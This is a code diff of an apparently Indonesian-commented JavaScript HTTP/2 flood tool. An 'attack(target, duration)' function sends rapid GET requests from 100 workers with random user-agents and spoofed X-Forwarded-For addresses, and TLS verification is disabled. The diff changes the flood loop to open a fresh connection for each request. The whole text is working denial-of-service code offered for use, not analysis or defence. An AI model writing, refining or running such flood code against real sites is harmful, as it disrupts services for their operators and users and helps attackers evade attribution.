@@ -70,33 +70,35 @@ const attack = async (target, duration) => {
 
 //========= FLOOD =========//
   const flood = async () => {
+  const endTime = Date.now() + duration * 1000;
+  while (Date.now() < endTime) {
     try {
-      const client = http2.connect(target, { rejectUnauthorized: false });
-      client.on('error', () => {});
-      await new Promise((resolve) => {
-        const start = Date.now();
-        const interval = setInterval(() => {
-          if (Date.now() - start >= duration * 1000) {
-            clearInterval(interval);
-            client.close();
-            resolve();
-            return;
-          }
-          const req = client.request({
-            ':method': 'GET',
-            ':path': '/',
-            'user-agent': userAgents[Math.floor(Math.random() * userAgents.length)],
-            'accept-language': 'en-US,en;q=0.9',
-            'x-forwarded-for': `${crypto.randomInt(1, 255)}.${crypto.randomInt(0, 255)}.${crypto.randomInt(0, 255)}.${crypto.randomInt(1, 255)}`,
-            'cache-control': 'no-cache'
-          });
-          req.on('response', () => req.close());
-          req.end();
-        }, 5); //========= BUAT TIME OUT =========//
+      const client = http2.connect(target, {
+        settings: { enablePush: false },
+        maxConcurrentStreams: 1,
+        rejectUnauthorized: false
       });
+
+      const req = client.request({
+        ':method': 'GET',
+        ':path': '/',
+        'user-agent': userAgents[Math.floor(Math.random() * userAgents.length)],
+        'accept-language': 'en-US,en;q=0.9',
+        'x-forwarded-for': `${crypto.randomInt(1, 255)}.${crypto.randomInt(0, 255)}.${crypto.randomInt(0, 255)}.${crypto.randomInt(1, 255)}`,
+        'cache-control': 'no-cache'
+      });
+
+      req.on('response', () => {
+        req.close();
+        client.close();
+      });
+
+      req.end();
     } catch (e) {
     }
-  };
+    await new Promise(r => setTimeout(r, 3)); 
+  }
+};
 
 //========= JANGAN TINGGI NGURAS CPU LU =========//
   const workerCount = 100; 
